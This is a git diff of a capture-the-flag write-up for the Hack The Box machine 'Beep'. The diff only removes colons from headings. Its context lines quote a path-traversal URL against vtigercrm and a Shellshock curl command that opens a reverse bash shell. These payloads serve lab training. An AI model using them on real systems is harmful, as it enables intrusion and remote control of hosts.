@@ -127,7 +127,7 @@ Finished
 
 
 
-## Method 1:
+## Method 1
 
 ### Gainin Access
 
@@ -162,7 +162,7 @@ Finished
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7ba531b7-f20d-4a5d-9968-6ccfdecbb510)
 
 
-## Method 2:
+## Method 2
 
 ### Privilege Escalation
 
@@ -203,7 +203,7 @@ view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4cf306f2-3f06-4311-ba44-3fba99817893)
 
 
-## Method 3:
+## Method 3
 
 ### Privilege Escalation
 
@@ -224,7 +224,7 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/27ac05b7-ad64-4ee1-9af6-012dc4b8b77a)
 
 
-## Method 4:
+## Method 4
 
 ### Privilege Escalation
 
@@ -245,7 +245,7 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 
 
 
-# References & Alternatives:
+# References & Alternatives
 + https://vvmlist.github.io/#beep
 + https://0xdf.gitlab.io/2021/02/23/htb-beep.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/beep-writeup-w-o-metasploit
